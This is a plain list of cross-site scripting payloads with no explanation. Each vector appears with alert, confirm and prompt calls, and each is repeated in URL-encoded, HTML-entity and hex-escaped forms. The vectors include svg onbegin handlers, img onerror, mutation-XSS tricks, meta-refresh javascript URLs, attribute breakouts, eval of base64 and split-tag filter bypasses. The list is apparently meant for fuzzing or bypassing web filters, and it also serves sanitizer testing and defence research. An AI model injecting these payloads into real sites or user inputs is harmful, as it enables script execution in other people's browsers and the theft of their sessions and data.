-&#70;unction&#96;confirm\&#92;x28document.domain\&#92;x29&#96;()
-&#70;unction&#96;prompt\&#92;x28document.domain\&#92;x29&#96;()
-\x46unction\x60alert\x5cx28document.domain\x5cx29\x60()
-\x46unction\x60confirm\x5cx28document.domain\x5cx29\x60()
-\x46unction\x60prompt\x5cx28document.domain\x5cx29\x60()
 [].constructor.constructor('alert(1)')()
 [].constructor.constructor('confirm(1)')()
 [].constructor.constructor('prompt(1)')()
-%5B%5D.constructor.constructor(%27alert(1)%27)()
-%5B%5D.constructor.constructor(%27confirm(1)%27)()
-%5B%5D.constructor.constructor(%27prompt(1)%27)()
-&#91;&#93;.constructor.constructor(&#39;alert(1)&#39;)()
-&#91;&#93;.constructor.constructor(&#39;confirm(1)&#39;)()
-&#91;&#93;.constructor.constructor(&#39;prompt(1)&#39;)()
-\x5b\x5d.constructor.constructor(\x27alert(1)\x27)()
-\x5b\x5d.constructor.constructor(\x27confirm(1)\x27)()
-\x5b\x5d.constructor.constructor(\x27prompt(1)\x27)()
 eval(atob('YWxlcnQoMSk='))
 eval(atob('Y29uZmlybSgxKQ=='))
 eval(atob('cHJvbXB0KDEp'))
-%65val(atob(%27YWxlcnQoMSk=%27))
-%65val(atob(%27Y29uZmlybSgxKQ==%27))
-%65val(atob(%27cHJvbXB0KDEp%27))
-&#101;val(atob(&#39;YWxlcnQoMSk=&#39;))
-&#101;val(atob(&#39;Y29uZmlybSgxKQ==&#39;))
-&#101;val(atob(&#39;cHJvbXB0KDEp&#39;))
-\x65val(atob(\x27YWxlcnQoMSk=\x27))
-\x65val(atob(\x27Y29uZmlybSgxKQ==\x27))
-\x65val(atob(\x27cHJvbXB0KDEp\x27))
 eval('\x61\x6c\x65\x72\x74(\x31)')
 eval('\x63\x6f\x6e\x66\x69\x72\x6d(\x31)')
 eval('\x70\x72\x6f\x6d\x70\x74(\x31)')
-eval('%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74(%5Cx31)')
-eval('%5Cx63%5Cx6f%5Cx6e%5Cx66%5Cx69%5Cx72%5Cx6d(%5Cx31)')
-eval('%5Cx70%5Cx72%5Cx6f%5Cx6d%5Cx70%5Cx74(%5Cx31)')
-eval('&#92;x61&#92;x6c&#92;x65&#92;x72&#92;x74(&#92;x31)')
-eval('&#92;x63&#92;x6f&#92;x6e&#92;x66&#92;x69&#92;x72&#92;x6d(&#92;x31)')
-eval('&#92;x70&#92;x72&#92;x6f&#92;x6d&#92;x70&#92;x74(&#92;x31)')
-eval('\x5cx61\x5cx6c\x5cx65\x5cx72\x5cx74(\x5cx31)')
-eval('\x5cx63\x5cx6f\x5cx6e\x5cx66\x5cx69\x5cx72\x5cx6d(\x5cx31)')
-eval('\x5cx70\x5cx72\x5cx6f\x5cx6d\x5cx70\x5cx74(\x5cx31)')
 <svg><script>alert(1)</script></svg>
 <svg><script>confirm(1)</script></svg>
 <svg><script>prompt(1)</script></svg>
-%3Csvg%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E
-%3Csvg%3E%3Cscript%3Econfirm(1)%3C/script%3E%3C/svg%3E
-%3Csvg%3E%3Cscript%3Eprompt(1)%3C/script%3E%3C/svg%3E
-&#60;svg&#62;&#60;script&#62;alert(1)&#60;/script&#62;&#60;/svg&#62;
-&#60;svg&#62;&#60;script&#62;confirm(1)&#60;/script&#62;&#60;/svg&#62;
-&#60;svg&#62;&#60;script&#62;prompt(1)&#60;/script&#62;&#60;/svg&#62;
-\x3csvg\x3e\x3cscript\x3ealert(1)\x3c/script\x3e\x3c/svg\x3e
-\x3csvg\x3e\x3cscript\x3econfirm(1)\x3c/script\x3e\x3c/svg\x3e
-\x3csvg\x3e\x3cscript\x3eprompt(1)\x3c/script\x3e\x3c/svg\x3e
 <svg><animate onbegin=alert(1) attributeName=x dur=1s>
 <svg><animate onbegin=confirm(1) attributeName=x dur=1s>
 <svg><animate onbegin=prompt(1) attributeName=x dur=1s>
-%3Csvg%3E%3Canimate%20onbegin=alert(1)%20attributeName=x%20dur=1s%3E
-%3Csvg%3E%3Canimate%20onbegin=confirm(1)%20attributeName=x%20dur=1s%3E
-%3Csvg%3E%3Canimate%20onbegin=prompt(1)%20attributeName=x%20dur=1s%3E
-&#60;svg&#62;&#60;animate onbegin=alert(1) attributeName=x dur=1s&#62;
-&#60;svg&#62;&#60;animate onbegin=confirm(1) attributeName=x dur=1s&#62;
-&#60;svg&#62;&#60;animate onbegin=prompt(1) attributeName=x dur=1s&#62;
-\x3csvg\x3e\x3canimate\x20onbegin=alert(1)\x20attributeName=x\x20dur=1s\x3e
-\x3csvg\x3e\x3canimate\x20onbegin=confirm(1)\x20attributeName=x\x20dur=1s\x3e
-\x3csvg\x3e\x3canimate\x20onbegin=prompt(1)\x20attributeName=x\x20dur=1s\x3e
 <svg><set onbegin=alert(1) attributeName=x to=1>
 <svg><set onbegin=confirm(1) attributeName=x to=1>
 <svg><set onbegin=prompt(1) attributeName=x to=1>
-%3Csvg%3E%3Cset%20onbegin=alert(1)%20attributeName=x%20to=1%3E
-%3Csvg%3E%3Cset%20onbegin=confirm(1)%20attributeName=x%20to=1%3E
-%3Csvg%3E%3Cset%20onbegin=prompt(1)%20attributeName=x%20to=1%3E
-&#60;svg&#62;&#60;set onbegin=alert(1) attributeName=x to=1&#62;
-&#60;svg&#62;&#60;set onbegin=confirm(1) attributeName=x to=1&#62;
-&#60;svg&#62;&#60;set onbegin=prompt(1) attributeName=x to=1&#62;
-\x3csvg\x3e\x3cset\x20onbegin=alert(1)\x20attributeName=x\x20to=1\x3e
-\x3csvg\x3e\x3cset\x20onbegin=confirm(1)\x20attributeName=x\x20to=1\x3e
-\x3csvg\x3e\x3cset\x20onbegin=prompt(1)\x20attributeName=x\x20to=1\x3e
 <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
 <math><mtext><table><mglyph><style><!--</style><img src=x onerror=confirm(1)>
 <math><mtext><table><mglyph><style><!--</style><img src=x onerror=prompt(1)>
-%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C!--%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)%3E
-%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C!--%3C/style%3E%3Cimg%20src=x%20onerror=confirm(1)%3E
-%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C!--%3C/style%3E%3Cimg%20src=x%20onerror=prompt(1)%3E
-&#60;math&#62;&#60;mtext&#62;&#60;table&#62;&#60;mglyph&#62;&#60;style&#62;&#60;!--&#60;/style&#62;&#60;img src=x onerror=alert(1)&#62;
-&#60;math&#62;&#60;mtext&#62;&#60;table&#62;&#60;mglyph&#62;&#60;style&#62;&#60;!--&#60;/style&#62;&#60;img src=x onerror=confirm(1)&#62;
-&#60;math&#62;&#60;mtext&#62;&#60;table&#62;&#60;mglyph&#62;&#60;style&#62;&#60;!--&#60;/style&#62;&#60;img src=x onerror=prompt(1)&#62;
-\x3cmath\x3e\x3cmtext\x3e\x3ctable\x3e\x3cmglyph\x3e\x3cstyle\x3e\x3c!--\x3c/style\x3e\x3cimg\x20src=x\x20onerror=alert(1)\x3e
-\x3cmath\x3e\x3cmtext\x3e\x3ctable\x3e\x3cmglyph\x3e\x3cstyle\x3e\x3c!--\x3c/style\x3e\x3cimg\x20src=x\x20onerror=confirm(1)\x3e
-\x3cmath\x3e\x3cmtext\x3e\x3ctable\x3e\x3cmglyph\x3e\x3cstyle\x3e\x3c!--\x3c/style\x3e\x3cimg\x20src=x\x20onerror=prompt(1)\x3e
 <!--<img src=x onerror=alert(1)>-->
 <!--<img src=x onerror=confirm(1)>-->
 <!--<img src=x onerror=prompt(1)>-->
-%3C!--%3Cimg%20src=x%20onerror=alert(1)%3E--%3E
-%3C!--%3Cimg%20src=x%20onerror=confirm(1)%3E--%3E
-%3C!--%3Cimg%20src=x%20onerror=prompt(1)%3E--%3E
-&#60;!--&#60;img src=x onerror=alert(1)&#62;--&#62;
-&#60;!--&#60;img src=x onerror=confirm(1)&#62;--&#62;
-&#60;!--&#60;img src=x onerror=prompt(1)&#62;--&#62;
-\x3c!--\x3cimg\x20src=x\x20onerror=alert(1)\x3e--\x3e
-\x3c!--\x3cimg\x20src=x\x20onerror=confirm(1)\x3e--\x3e
-\x3c!--\x3cimg\x20src=x\x20onerror=prompt(1)\x3e--\x3e
 --><img src=x onerror=alert(1)>
 --><img src=x onerror=confirm(1)>
 --><img src=x onerror=prompt(1)>
---%3E%3Cimg%20src=x%20onerror=alert(1)%3E
---%3E%3Cimg%20src=x%20onerror=confirm(1)%3E
---%3E%3Cimg%20src=x%20onerror=prompt(1)%3E
---&#62;&#60;img src=x onerror=alert(1)&#62;
---&#62;&#60;img src=x onerror=confirm(1)&#62;
---&#62;&#60;img src=x onerror=prompt(1)&#62;
---\x3e\x3cimg\x20src=x\x20onerror=alert(1)\x3e
---\x3e\x3cimg\x20src=x\x20onerror=confirm(1)\x3e
---\x3e\x3cimg\x20src=x\x20onerror=prompt(1)\x3e
 <meta http-equiv=refresh content="0;url=javascript:alert(1)">
 <meta http-equiv=refresh content="0;url=javascript:confirm(1)">
 <meta http-equiv=refresh content="0;url=javascript:prompt(1)">
-%3Cmeta%20http-equiv=refresh%20content=%220;url=javascript:alert(1)%22%3E
-%3Cmeta%20http-equiv=refresh%20content=%220;url=javascript:confirm(1)%22%3E
-%3Cmeta%20http-equiv=refresh%20content=%220;url=javascript:prompt(1)%22%3E
-&#60;meta http-equiv=refresh content=&#34;0;url=javascript:alert(1)&#34;&#62;
-&#60;meta http-equiv=refresh content=&#34;0;url=javascript:confirm(1)&#34;&#62;
-&#60;meta http-equiv=refresh content=&#34;0;url=javascript:prompt(1)&#34;&#62;
-\x3cmeta\x20http-equiv=refresh\x20content=\x220;url=javascript:alert(1)\x22\x3e
-\x3cmeta\x20http-equiv=refresh\x20content=\x220;url=javascript:confirm(1)\x22\x3e
-\x3cmeta\x20http-equiv=refresh\x20content=\x220;url=javascript:prompt(1)\x22\x3e
 <style>@import'javascript:alert(1)';</style>
 <style>@import'javascript:confirm(1)';</style>
 <style>@import'javascript:prompt(1)';</style>
-%3Cstyle%3E@import%27javascript:alert(1)%27;%3C/style%3E
-%3Cstyle%3E@import%27javascript:confirm(1)%27;%3C/style%3E
-%3Cstyle%3E@import%27javascript:prompt(1)%27;%3C/style%3E
-&#60;style&#62;@import&#39;javascript:alert(1)&#39;;&#60;/style&#62;
-&#60;style&#62;@import&#39;javascript:confirm(1)&#39;;&#60;/style&#62;
-&#60;style&#62;@import&#39;javascript:prompt(1)&#39;;&#60;/style&#62;
-\x3cstyle\x3e@import\x27javascript:alert(1)\x27;\x3c/style\x3e
-\x3cstyle\x3e@import\x27javascript:confirm(1)\x27;\x3c/style\x3e
-\x3cstyle\x3e@import\x27javascript:prompt(1)\x27;\x3c/style\x3e
 <div style="width:expression(alert(1))">x</div>
 <div style="width:expression(confirm(1))">x</div>
 <div style="width:expression(prompt(1))">x</div>
-%3Cdiv%20style=%22width:expression(alert(1))%22%3Ex%3C/div%3E
-%3Cdiv%20style=%22width:expression(confirm(1))%22%3Ex%3C/div%3E
-%3Cdiv%20style=%22width:expression(prompt(1))%22%3Ex%3C/div%3E
-&#60;div style=&#34;width:expression(alert(1))&#34;&#62;x&#60;/div&#62;
-&#60;div style=&#34;width:expression(confirm(1))&#34;&#62;x&#60;/div&#62;
-&#60;div style=&#34;width:expression(prompt(1))&#34;&#62;x&#60;/div&#62;
-\x3cdiv\x20style=\x22width:expression(alert(1))\x22\x3ex\x3c/div\x3e
-\x3cdiv\x20style=\x22width:expression(confirm(1))\x22\x3ex\x3c/div\x3e
-\x3cdiv\x20style=\x22width:expression(prompt(1))\x22\x3ex\x3c/div\x3e
 " onmouseover=alert(1) x="
 " onmouseover=confirm(1) x="
 " onmouseover=prompt(1) x="
-%22%20onmouseover=alert(1)%20x=%22
-%22%20onmouseover=confirm(1)%20x=%22
-%22%20onmouseover=prompt(1)%20x=%22
-&#34; onmouseover=alert(1) x=&#34;
-&#34; onmouseover=confirm(1) x=&#34;
-&#34; onmouseover=prompt(1) x=&#34;
-\x22\x20onmouseover=alert(1)\x20x=\x22
-\x22\x20onmouseover=confirm(1)\x20x=\x22
-\x22\x20onmouseover=prompt(1)\x20x=\x22
 ' onmouseover=alert(1) x='
 ' onmouseover=confirm(1) x='
 ' onmouseover=prompt(1) x='
-%27%20onmouseover=alert(1)%20x=%27
-%27%20onmouseover=confirm(1)%20x=%27
-%27%20onmouseover=prompt(1)%20x=%27
-&#39; onmouseover=alert(1) x=&#39;
-&#39; onmouseover=confirm(1) x=&#39;
-&#39; onmouseover=prompt(1) x=&#39;
-\x27\x20onmouseover=alert(1)\x20x=\x27
-\x27\x20onmouseover=confirm(1)\x20x=\x27
-\x27\x20onmouseover=prompt(1)\x20x=\x27
 " autofocus onfocus=alert(1) x="
 " autofocus onfocus=confirm(1) x="
 " autofocus onfocus=prompt(1) x="
-%22%20autofocus%20onfocus=alert(1)%20x=%22
-%22%20autofocus%20onfocus=confirm(1)%20x=%22
-%22%20autofocus%20onfocus=prompt(1)%20x=%22
-&#34; autofocus onfocus=alert(1) x=&#34;
-&#34; autofocus onfocus=confirm(1) x=&#34;
-&#34; autofocus onfocus=prompt(1) x=&#34;
-\x22\x20autofocus\x20onfocus=alert(1)\x20x=\x22
-\x22\x20autofocus\x20onfocus=confirm(1)\x20x=\x22
-\x22\x20autofocus\x20onfocus=prompt(1)\x20x=\x22
 " onclick=alert(1) x="
 " onclick=confirm(1) x="
 " onclick=prompt(1) x="
-%22%20onclick=alert(1)%20x=%22
-%22%20onclick=confirm(1)%20x=%22
-%22%20onclick=prompt(1)%20x=%22
-&#34; onclick=alert(1) x=&#34;
-&#34; onclick=confirm(1) x=&#34;
-&#34; onclick=prompt(1) x=&#34;
-\x22\x20onclick=alert(1)\x20x=\x22
-\x22\x20onclick=confirm(1)\x20x=\x22
-\x22\x20onclick=prompt(1)\x20x=\x22
 <svg><p><style><img src=x onerror=alert(1)></style></p></svg>
 <svg><p><style><img src=x onerror=confirm(1)></style></p></svg>
 <svg><p><style><img src=x onerror=prompt(1)></style></p></svg>
-%3Csvg%3E%3Cp%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3C/p%3E%3C/svg%3E
-%3Csvg%3E%3Cp%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=confirm(1)%3E%3C/style%3E%3C/p%3E%3C/svg%3E
-%3Csvg%3E%3Cp%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=prompt(1)%3E%3C/style%3E%3C/p%3E%3C/svg%3E
-&#60;svg&#62;&#60;p&#62;&#60;style&#62;&#60;img src=x onerror=alert(1)&#62;&#60;/style&#62;&#60;/p&#62;&#60;/svg&#62;
-&#60;svg&#62;&#60;p&#62;&#60;style&#62;&#60;img src=x onerror=confirm(1)&#62;&#60;/style&#62;&#60;/p&#62;&#60;/svg&#62;
-&#60;svg&#62;&#60;p&#62;&#60;style&#62;&#60;img src=x onerror=prompt(1)&#62;&#60;/style&#62;&#60;/p&#62;&#60;/svg&#62;
-\x3csvg\x3e\x3cp\x3e\x3cstyle\x3e\x3cimg\x20src=x\x20onerror=alert(1)\x3e\x3c/style\x3e\x3c/p\x3e\x3c/svg\x3e
-\x3csvg\x3e\x3cp\x3e\x3cstyle\x3e\x3cimg\x20src=x\x20onerror=confirm(1)\x3e\x3c/style\x3e\x3c/p\x3e\x3c/svg\x3e
-\x3csvg\x3e\x3cp\x3e\x3cstyle\x3e\x3cimg\x20src=x\x20onerror=prompt(1)\x3e\x3c/style\x3e\x3c/p\x3e\x3c/svg\x3e
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
 <noscript><p title="</noscript><img src=x onerror=confirm(1)>">
 <noscript><p title="</noscript><img src=x onerror=prompt(1)>">
-%3Cnoscript%3E%3Cp%20title=%22%3C/noscript%3E%3Cimg%20src=x%20onerror=alert(1)%3E%22%3E
-%3Cnoscript%3E%3Cp%20title=%22%3C/noscript%3E%3Cimg%20src=x%20onerror=confirm(1)%3E%22%3E
-%3Cnoscript%3E%3Cp%20title=%22%3C/noscript%3E%3Cimg%20src=x%20onerror=prompt(1)%3E%22%3E
-&#60;noscript&#62;&#60;p title=&#34;&#60;/noscript&#62;&#60;img src=x onerror=alert(1)&#62;&#34;&#62;
-&#60;noscript&#62;&#60;p title=&#34;&#60;/noscript&#62;&#60;img src=x onerror=confirm(1)&#62;&#34;&#62;
-&#60;noscript&#62;&#60;p title=&#34;&#60;/noscript&#62;&#60;img src=x onerror=prompt(1)&#62;&#34;&#62;
-\x3cnoscript\x3e\x3cp\x20title=\x22\x3c/noscript\x3e\x3cimg\x20src=x\x20onerror=alert(1)\x3e\x22\x3e
-\x3cnoscript\x3e\x3cp\x20title=\x22\x3c/noscript\x3e\x3cimg\x20src=x\x20onerror=confirm(1)\x3e\x22\x3e
-\x3cnoscript\x3e\x3cp\x20title=\x22\x3c/noscript\x3e\x3cimg\x20src=x\x20onerror=prompt(1)\x3e\x22\x3e
 <template><img src=x onerror=alert(1)></template>
 <template><img src=x onerror=confirm(1)></template>
 <template><img src=x onerror=prompt(1)></template>
-%3Ctemplate%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/template%3E
-%3Ctemplate%3E%3Cimg%20src=x%20onerror=confirm(1)%3E%3C/template%3E
-%3Ctemplate%3E%3Cimg%20src=x%20onerror=prompt(1)%3E%3C/template%3E
-&#60;template&#62;&#60;img src=x onerror=alert(1)&#62;&#60;/template&#62;
-&#60;template&#62;&#60;img src=x onerror=confirm(1)&#62;&#60;/template&#62;
-&#60;template&#62;&#60;img src=x onerror=prompt(1)&#62;&#60;/template&#62;
-\x3ctemplate\x3e\x3cimg\x20src=x\x20onerror=alert(1)\x3e\x3c/template\x3e
-\x3ctemplate\x3e\x3cimg\x20src=x\x20onerror=confirm(1)\x3e\x3c/template\x3e
-\x3ctemplate\x3e\x3cimg\x20src=x\x20onerror=prompt(1)\x3e\x3c/template\x3e
 <noembed><img src=x onerror=alert(1)></noembed>
 <noembed><img src=x onerror=confirm(1)></noembed>
 <noembed><img src=x onerror=prompt(1)></noembed>
-%3Cnoembed%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/noembed%3E
-%3Cnoembed%3E%3Cimg%20src=x%20onerror=confirm(1)%3E%3C/noembed%3E
-%3Cnoembed%3E%3Cimg%20src=x%20onerror=prompt(1)%3E%3C/noembed%3E
-&#60;noembed&#62;&#60;img src=x onerror=alert(1)&#62;&#60;/noembed&#62;
-&#60;noembed&#62;&#60;img src=x onerror=confirm(1)&#62;&#60;/noembed&#62;
-&#60;noembed&#62;&#60;img src=x onerror=prompt(1)&#62;&#60;/noembed&#62;
-\x3cnoembed\x3e\x3cimg\x20src=x\x20onerror=alert(1)\x3e\x3c/noembed\x3e
-\x3cnoembed\x3e\x3cimg\x20src=x\x20onerror=confirm(1)\x3e\x3c/noembed\x3e
-\x3cnoembed\x3e\x3cimg\x20src=x\x20onerror=prompt(1)\x3e\x3c/noembed\x3e
 <noframes><img src=x onerror=alert(1)></noframes>
 <noframes><img src=x onerror=confirm(1)></noframes>
 <noframes><img src=x onerror=prompt(1)></noframes>
-%3Cnoframes%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/noframes%3E
-%3Cnoframes%3E%3Cimg%20src=x%20onerror=confirm(1)%3E%3C/noframes%3E
-%3Cnoframes%3E%3Cimg%20src=x%20onerror=prompt(1)%3E%3C/noframes%3E
-&#60;noframes&#62;&#60;img src=x onerror=alert(1)&#62;&#60;/noframes&#62;
-&#60;noframes&#62;&#60;img src=x onerror=confirm(1)&#62;&#60;/noframes&#62;
-&#60;noframes&#62;&#60;img src=x onerror=prompt(1)&#62;&#60;/noframes&#62;
-\x3cnoframes\x3e\x3cimg\x20src=x\x20onerror=alert(1)\x3e\x3c/noframes\x3e
-\x3cnoframes\x3e\x3cimg\x20src=x\x20onerror=confirm(1)\x3e\x3c/noframes\x3e
-\x3cnoframes\x3e\x3cimg\x20src=x\x20onerror=prompt(1)\x3e\x3c/noframes\x3e
 <xss id=x tabindex=1 onfocus=alert(1)></xss>
 <xss id=x tabindex=1 onfocus=confirm(1)></xss>
 <xss id=x tabindex=1 onfocus=prompt(1)></xss>
-%3Cxss%20id=x%20tabindex=1%20onfocus=alert(1)%3E%3C/xss%3E
-%3Cxss%20id=x%20tabindex=1%20onfocus=confirm(1)%3E%3C/xss%3E
-%3Cxss%20id=x%20tabindex=1%20onfocus=prompt(1)%3E%3C/xss%3E
-&#60;xss id=x tabindex=1 onfocus=alert(1)&#62;&#60;/xss&#62;
-&#60;xss id=x tabindex=1 onfocus=confirm(1)&#62;&#60;/xss&#62;
-&#60;xss id=x tabindex=1 onfocus=prompt(1)&#62;&#60;/xss&#62;
-\x3cxss\x20id=x\x20tabindex=1\x20onfocus=alert(1)\x3e\x3c/xss\x3e
-\x3cxss\x20id=x\x20tabindex=1\x20onfocus=confirm(1)\x3e\x3c/xss\x3e
-\x3cxss\x20id=x\x20tabindex=1\x20onfocus=prompt(1)\x3e\x3c/xss\x3e
 <video><source onerror=alert(1)></video>
 <video><source onerror=confirm(1)></video>
 <video><source onerror=prompt(1)></video>
-%3Cvideo%3E%3Csource%20onerror=alert(1)%3E%3C/video%3E
-%3Cvideo%3E%3Csource%20onerror=confirm(1)%3E%3C/video%3E
-%3Cvideo%3E%3Csource%20onerror=prompt(1)%3E%3C/video%3E
-&#60;video&#62;&#60;source onerror=alert(1)&#62;&#60;/video&#62;
-&#60;video&#62;&#60;source onerror=confirm(1)&#62;&#60;/video&#62;
-&#60;video&#62;&#60;source onerror=prompt(1)&#62;&#60;/video&#62;
-\x3cvideo\x3e\x3csource\x20onerror=alert(1)\x3e\x3c/video\x3e
-\x3cvideo\x3e\x3csource\x20onerror=confirm(1)\x3e\x3c/video\x3e
-\x3cvideo\x3e\x3csource\x20onerror=prompt(1)\x3e\x3c/video\x3e
 <object data="data:text/html,<script>alert(1)</script>"></object>
 <object data="data:text/html,<script>confirm(1)</script>"></object>
 <object data="data:text/html,<script>prompt(1)</script>"></object>
-%3Cobject%20data=%22data:text/html,%3Cscript%3Ealert(1)%3C/script%3E%22%3E%3C/object%3E
-%3Cobject%20data=%22data:text/html,%3Cscript%3Econfirm(1)%3C/script%3E%22%3E%3C/object%3E
-%3Cobject%20data=%22data:text/html,%3Cscript%3Eprompt(1)%3C/script%3E%22%3E%3C/object%3E
-&#60;object data=&#34;data:text/html,&#60;script&#62;alert(1)&#60;/script&#62;&#34;&#62;&#60;/object&#62;
-&#60;object data=&#34;data:text/html,&#60;script&#62;confirm(1)&#60;/script&#62;&#34;&#62;&#60;/object&#62;
-&#60;object data=&#34;data:text/html,&#60;script&#62;prompt(1)&#60;/script&#62;&#34;&#62;&#60;/object&#62;
-\x3cobject\x20data=\x22data:text/html,\x3cscript\x3ealert(1)\x3c/script\x3e\x22\x3e\x3c/object\x3e
-\x3cobject\x20data=\x22data:text/html,\x3cscript\x3econfirm(1)\x3c/script\x3e\x22\x3e\x3c/object\x3e
-\x3cobject\x20data=\x22data:text/html,\x3cscript\x3eprompt(1)\x3c/script\x3e\x22\x3e\x3c/object\x3e
 <embed src="data:text/html,<script>alert(1)</script>">
 <embed src="data:text/html,<script>confirm(1)</script>">
 <embed src="data:text/html,<script>prompt(1)</script>">
-%3Cembed%20src=%22data:text/html,%3Cscript%3Ealert(1)%3C/script%3E%22%3E
-%3Cembed%20src=%22data:text/html,%3Cscript%3Econfirm(1)%3C/script%3E%22%3E
-%3Cembed%20src=%22data:text/html,%3Cscript%3Eprompt(1)%3C/script%3E%22%3E
-&#60;embed src=&#34;data:text/html,&#60;script&#62;alert(1)&#60;/script&#62;&#34;&#62;
-&#60;embed src=&#34;data:text/html,&#60;script&#62;confirm(1)&#60;/script&#62;&#34;&#62;
-&#60;embed src=&#34;data:text/html,&#60;script&#62;prompt(1)&#60;/script&#62;&#34;&#62;
-\x3cembed\x20src=\x22data:text/html,\x3cscript\x3ealert(1)\x3c/script\x3e\x22\x3e
-\x3cembed\x20src=\x22data:text/html,\x3cscript\x3econfirm(1)\x3c/script\x3e\x22\x3e
-\x3cembed\x20src=\x22data:text/html,\x3cscript\x3eprompt(1)\x3c/script\x3e\x22\x3e
 #"><img src=x onerror=alert(1)>
 #"><img src=x onerror=confirm(1)>
 #"><img src=x onerror=prompt(1)>
-%23%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E
-%23%22%3E%3Cimg%20src=x%20onerror=confirm(1)%3E
-%23%22%3E%3Cimg%20src=x%20onerror=prompt(1)%3E
-&#35;&#34;&#62;&#60;img src=x onerror=alert(1)&#62;
-&#35;&#34;&#62;&#60;img src=x onerror=confirm(1)&#62;
-&#35;&#34;&#62;&#60;img src=x onerror=prompt(1)&#62;
-\x23\x22\x3e\x3cimg\x20src=x\x20onerror=alert(1)\x3e
-\x23\x22\x3e\x3cimg\x20src=x\x20onerror=confirm(1)\x3e
-\x23\x22\x3e\x3cimg\x20src=x\x20onerror=prompt(1)\x3e
 <scr<script>ipt>alert(1)</scr</script>ipt>
 <scr<script>ipt>confirm(1)</scr</script>ipt>
 <scr<script>ipt>prompt(1)</scr</script>ipt>
-%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E
-%3Cscr%3Cscript%3Eipt%3Econfirm(1)%3C/scr%3C/script%3Eipt%3E
-%3Cscr%3Cscript%3Eipt%3Eprompt(1)%3C/scr%3C/script%3Eipt%3E
-&#60;scr&#60;script&#62;ipt&#62;alert(1)&#60;/scr&#60;/script&#62;ipt&#62;
-&#60;scr&#60;script&#62;ipt&#62;confirm(1)&#60;/scr&#60;/script&#62;ipt&#62;
-&#60;scr&#60;script&#62;ipt&#62;prompt(1)&#60;/scr&#60;/script&#62;ipt&#62;
-\x3cscr\x3cscript\x3eipt\x3ealert(1)\x3c/scr\x3c/script\x3eipt\x3e
-\x3cscr\x3cscript\x3eipt\x3econfirm(1)\x3c/scr\x3c/script\x3eipt\x3e
-\x3cscr\x3cscript\x3eipt\x3eprompt(1)\x3c/scr\x3c/script\x3eipt\x3e
 <script>al\u0065rt(1)</script>
 <script>con\u0066irm(1)</script>
 <script>pro\u006Dpt(1)</script>
-%3Cscript%3Eal%5Cu0065rt(1)%3C/script%3E
-%3Cscript%3Econ%5Cu0066irm(1)%3C/script%3E
-%3Cscript%3Epro%5Cu006Dpt(1)%3C/script%3E
-&#60;script&#62;al\&#92;u0065rt(1)&#60;/script&#62;
-&#60;script&#62;con\&#92;u0066irm(1)&#60;/script&#62;
-&#60;script&#62;pro\&#92;u006Dpt(1)&#60;/script&#62;
-\x3cscript\x3eal\x5cu0065rt(1)\x3c/script\x3e
-\x3cscript\x3econ\x5cu0066irm(1)\x3c/script\x3e
-\x3cscript\x3epro\x5cu006Dpt(1)\x3c/script\x3e
 <script>window['al'%2B'ert'](1)</script>
 <script>window['con'%2B'firm'](1)</script>
 <script>window['pro'%2B'mpt'](1)</script>
-%3Cscript%3Ewindow%5B%27al%27%2B%27ert%27%5D(1)%3C/script%3E
-%3Cscript%3Ewindow%5B%27con%27%2B%27firm%27%5D(1)%3C/script%3E
-%3Cscript%3Ewindow%5B%27pro%27%2B%27mpt%27%5D(1)%3C/script%3E
-&#60;script&#62;window&#91;&#39;al&#39;+&#39;ert&#39;&#93;(1)&#60;/script&#62;
-&#60;script&#62;window&#91;&#39;con&#39;+&#39;firm&#39;&#93;(1)&#60;/script&#62;
-&#60;script&#62;window&#91;&#39;pro&#39;+&#39;mpt&#39;&#93;(1)&#60;/script&#62;
-\x3cscript\x3ewindow\x5b\x27al\x27+\x27ert\x27\x5d(1)\x3c/script\x3e
-\x3cscript\x3ewindow\x5b\x27con\x27+\x27firm\x27\x5d(1)\x3c/script\x3e
-\x3cscript\x3ewindow\x5b\x27pro\x27+\x27mpt\x27\x5d(1)\x3c/script\x3e
 <img src=x onerror=globalThis['alert'](1)>
 <img src=x onerror=globalThis['confirm'](1)>
 <img src=x onerror=globalThis['prompt'](1)>
-%3Cimg%20src=x%20onerror=globalThis%5B%27alert%27%5D(1)%3E
-%3Cimg%20src=x%20onerror=globalThis%5B%27confirm%27%5D(1)%3E
-%3Cimg%20src=x%20onerror=globalThis%5B%27prompt%27%5D(1)%3E
-&#60;img src=x onerror=globalThis&#91;&#39;alert&#39;&#93;(1)&#62;
-&#60;img src=x onerror=globalThis&#91;&#39;confirm&#39;&#93;(1)&#62;
-&#60;img src=x onerror=globalThis&#91;&#39;prompt&#39;&#93;(1)&#62;
-\x3cimg\x20src=x\x20onerror=globalThis\x5b\x27alert\x27\x5d(1)\x3e
-\x3cimg\x20src=x\x20onerror=globalThis\x5b\x27confirm\x27\x5d(1)\x3e
-\x3cimg\x20src=x\x20onerror=globalThis\x5b\x27prompt\x27\x5d(1)\x3e
 <img src=x style=x:expression(alert(1))>
 <img src=x style=x:expression(confirm(1))>
 <img src=x style=x:expression(prompt(1))>
-%3Cimg%20src=x%20style=x:expression(alert(1))%3E
-%3Cimg%20src=x%20style=x:expression(confirm(1))%3E
-%3Cimg%20src=x%20style=x:expression(prompt(1))%3E
-&#60;img src=x style=x:expression(alert(1))&#62;
-&#60;img src=x style=x:expression(confirm(1))&#62;
-&#60;img src=x style=x:expression(prompt(1))&#62;
-\x3cimg\x20src=x\x20style=x:expression(alert(1))\x3e
-\x3cimg\x20src=x\x20style=x:expression(confirm(1))\x3e
-\x3cimg\x20src=x\x20style=x:expression(prompt(1))\x3e
